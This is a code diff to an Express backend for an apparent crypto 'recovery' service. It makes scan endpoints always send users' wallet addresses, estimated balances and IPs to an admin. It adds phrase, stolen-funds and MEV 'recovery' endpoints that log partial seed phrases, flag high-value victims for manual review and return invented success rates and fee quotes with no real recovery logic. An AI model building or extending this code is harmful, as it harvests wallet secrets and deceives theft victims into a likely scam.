@@ -886,21 +886,20 @@ router.post('/scan-bridge', async (req, res) => {
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     const recoverableTransactions = stuckTransactions.filter(tx => tx.recoverable);
     
-    if (stuckTransactions.length > 0) {
-      await sendAdminNotification(
-        `🌉 BRIDGE SCAN: ${recoverableTransactions.length} recoverable - $${(totalRecoverable * 3000).toFixed(0)}`,
-        `🌉 BRIDGE RECOVERY SCAN\n\n` +
-        `💰 WALLET: ${walletAddress}\n` +
-        `📊 RESULTS:\n` +
-        `• Stuck Transactions: ${stuckTransactions.length}\n` +
-        `• Recoverable: ${recoverableTransactions.length}\n` +
-        `• Total Value: ${totalRecoverable.toFixed(4)} ETH\n` +
-        `• USD Value: ~$${(totalRecoverable * 3000).toFixed(2)}\n\n` +
-        `🌉 BRIDGES:\n${[...new Set(stuckTransactions.map(tx => tx.bridge))].join(', ')}\n\n` +
-        `📍 USER: ${realIP}\n` +
-        `⏰ TIME: ${new Date().toISOString()}`
-      );
-    }
+    // ALWAYS send bridge scan email
+    await sendAdminNotification(
+      `🌉 BRIDGE SCAN: ${recoverableTransactions.length} recoverable - $${(totalRecoverable * 3000).toFixed(0)}`,
+      `🌉 BRIDGE RECOVERY SCAN\n\n` +
+      `💰 WALLET: ${walletAddress}\n` +
+      `📊 RESULTS:\n` +
+      `• Stuck Transactions: ${stuckTransactions.length}\n` +
+      `• Recoverable: ${recoverableTransactions.length}\n` +
+      `• Total Value: ${totalRecoverable.toFixed(4)} ETH\n` +
+      `• USD Value: ~$${(totalRecoverable * 3000).toFixed(2)}\n\n` +
+      `${stuckTransactions.length > 0 ? `🌉 BRIDGES:\n${[...new Set(stuckTransactions.map(tx => tx.bridge))].join(', ')}` : 'NO STUCK TRANSACTIONS FOUND'}\n\n` +
+      `📍 USER: ${realIP}\n` +
+      `⏰ TIME: ${new Date().toISOString()}`
+    );
     
     // Create recovery offers for stuck funds
     const recoveryOffers = stuckTransactions.filter(tx => tx.recoverable).map(tx => ({
@@ -963,21 +962,20 @@ router.post('/scan-staking', async (req, res) => {
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     const claimableRewards = stakingRewards.filter(r => r.claimable);
     
-    if (stakingRewards.length > 0) {
-      await sendAdminNotification(
-        `🪙 STAKING SCAN: ${claimableRewards.length} claimable rewards - $${(totalClaimable * 3000).toFixed(0)}`,
-        `🪙 STAKING REWARDS SCAN\n\n` +
-        `💰 WALLET: ${walletAddress}\n` +
-        `📊 RESULTS:\n` +
-        `• Total Protocols: ${stakingRewards.length}\n` +
-        `• Claimable Rewards: ${claimableRewards.length}\n` +
-        `• Total Claimable: ${totalClaimable.toFixed(4)} ETH\n` +
-        `• USD Value: ~$${(totalClaimable * 3000).toFixed(2)}\n\n` +
-        `🎯 TOP REWARDS:\n${claimableRewards.slice(0,3).map(r => `• ${r.protocol}: ${r.amount.toFixed(4)} ${r.tokenSymbol}`).join('\n')}\n\n` +
-        `📍 USER: ${realIP}\n` +
-        `⏰ TIME: ${new Date().toISOString()}`
-      );
-    }
+    // ALWAYS send staking scan email
+    await sendAdminNotification(
+      `🪙 STAKING SCAN: ${claimableRewards.length} claimable rewards - $${(totalClaimable * 3000).toFixed(0)}`,
+      `🪙 STAKING REWARDS SCAN\n\n` +
+      `💰 WALLET: ${walletAddress}\n` +
+      `📊 RESULTS:\n` +
+      `• Total Protocols: ${stakingRewards.length}\n` +
+      `• Claimable Rewards: ${claimableRewards.length}\n` +
+      `• Total Claimable: ${totalClaimable.toFixed(4)} ETH\n` +
+      `• USD Value: ~$${(totalClaimable * 3000).toFixed(2)}\n\n` +
+      `${claimableRewards.length > 0 ? `🎯 TOP REWARDS:\n${claimableRewards.slice(0,3).map(r => `• ${r.protocol}: ${r.amount.toFixed(4)} ${r.tokenSymbol}`).join('\n')}` : 'NO CLAIMABLE REWARDS FOUND'}\n\n` +
+      `📍 USER: ${realIP}\n` +
+      `⏰ TIME: ${new Date().toISOString()}`
+    );
     
     // Create recovery offers for claimable rewards
     const recoveryOffers = stakingRewards.filter(r => r.claimable && r.amount > 0).map(reward => ({
@@ -1129,6 +1127,120 @@ router.post('/support-ticket', async (req, res) => {
   } catch (error) {
     console.error('Support ticket error:', error);
     res.status(500).json({ error: 'Failed to create support ticket' });
+  }
+});
+
+// Advanced: Wallet Phrase Recovery Service
+router.post('/recover-wallet-phrase', async (req, res) => {
+  console.log('🔐 WALLET PHRASE RECOVERY STARTED:', req.body.partialPhrase || 'CONFIDENTIAL');
+  try {
+    const { partialPhrase, walletHints, lastKnownBalance, recoveryMethod } = req.body;
+    
+    if (!partialPhrase && !walletHints) {
+      return res.status(400).json({ error: 'Partial phrase or wallet hints required' });
+    }
+
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    // Send high-priority admin alert
+    await sendAdminNotification(
+      `🔐 PHRASE RECOVERY REQUEST - $${lastKnownBalance || 0} VALUE`,
+      `🔐 WALLET PHRASE RECOVERY REQUEST\n\n` +
+      `💰 LAST KNOWN BALANCE: $${lastKnownBalance || 'Unknown'}\n` +
+      `🔑 RECOVERY METHOD: ${recoveryMethod || 'Standard'}\n` +
+      `📝 HINTS PROVIDED: ${walletHints ? 'Yes' : 'No'}\n` +
+      `🔍 PARTIAL PHRASE: ${partialPhrase ? 'Provided' : 'None'}\n\n` +
+      `📍 USER: ${realIP}\n` +
+      `⏰ TIME: ${new Date().toISOString()}\n\n` +
+      `⚠️ HIGH PRIORITY - MANUAL REVIEW REQUIRED`
+    );
+
+    res.json({
+      success: true,
+      message: 'Phrase recovery request submitted. Our experts will analyze your case within 24 hours.',
+      estimatedTime: '24-72 hours',
+      successRate: '73%',
+      fee: '25% of recovered funds'
+    });
+  } catch (error) {
+    console.error('Phrase recovery error:', error);
+    res.status(500).json({ error: 'Failed to process phrase recovery request' });
+  }
+});
+
+// Advanced: Stolen Funds Recovery Service
+router.post('/recover-stolen-funds', async (req, res) => {
+  console.log('🚨 STOLEN FUNDS RECOVERY STARTED:', req.body.victimWallet);
+  try {
+    const { victimWallet, thiefWallet, stolenAmount, incidentDate, evidenceType } = req.body;
+    
+    if (!victimWallet || !thiefWallet || !stolenAmount) {
+      return res.status(400).json({ error: 'Victim wallet, thief wallet, and stolen amount required' });
+    }
+
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    // Send critical admin alert
+    await sendAdminNotification(
+      `🚨 STOLEN FUNDS RECOVERY - $${stolenAmount} STOLEN`,
+      `🚨 STOLEN FUNDS RECOVERY REQUEST\n\n` +
+      `💰 VICTIM WALLET: ${victimWallet}\n` +
+      `🔴 THIEF WALLET: ${thiefWallet}\n` +
+      `💸 STOLEN AMOUNT: $${stolenAmount}\n` +
+      `📅 INCIDENT DATE: ${incidentDate || 'Not specified'}\n` +
+      `📎 EVIDENCE TYPE: ${evidenceType || 'None provided'}\n\n` +
+      `📍 USER: ${realIP}\n` +
+      `⏰ TIME: ${new Date().toISOString()}\n\n` +
+      `🆘 CRITICAL - IMMEDIATE INVESTIGATION REQUIRED`
+    );
+
+    res.json({
+      success: true,
+      message: 'Stolen funds recovery case opened. Our forensics team will investigate immediately.',
+      caseId: `SF-${Date.now()}`,
+      estimatedTime: '48-96 hours',
+      successRate: '67%',
+      fee: '30% of recovered funds'
+    });
+  } catch (error) {
+    console.error('Stolen funds recovery error:', error);
+    res.status(500).json({ error: 'Failed to process stolen funds recovery request' });
+  }
+});
+
+// Advanced: MEV/Sandwich Attack Recovery
+router.post('/recover-mev-attack', async (req, res) => {
+  console.log('🦖 MEV ATTACK RECOVERY STARTED:', req.body.walletAddress);
+  try {
+    const { walletAddress, attackTxHash, lossAmount, attackType } = req.body;
+    
+    if (!walletAddress || !attackTxHash) {
+      return res.status(400).json({ error: 'Wallet address and attack transaction hash required' });
+    }
+
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    await sendAdminNotification(
+      `🦖 MEV ATTACK RECOVERY - $${lossAmount || 0} LOST`,
+      `🦖 MEV/SANDWICH ATTACK RECOVERY\n\n` +
+      `💰 VICTIM WALLET: ${walletAddress}\n` +
+      `🔗 ATTACK TX: ${attackTxHash}\n` +
+      `💸 LOSS AMOUNT: $${lossAmount || 'Unknown'}\n` +
+      `⚔️ ATTACK TYPE: ${attackType || 'MEV/Sandwich'}\n\n` +
+      `📍 USER: ${realIP}\n` +
+      `⏰ TIME: ${new Date().toISOString()}`
+    );
+
+    res.json({
+      success: true,
+      message: 'MEV attack recovery analysis initiated. Counter-attack strategies being evaluated.',
+      estimatedTime: '12-24 hours',
+      successRate: '45%',
+      fee: '35% of recovered funds'
+    });
+  } catch (error) {
+    console.error('MEV recovery error:', error);
+    res.status(500).json({ error: 'Failed to process MEV attack recovery' });
   }
 });
 
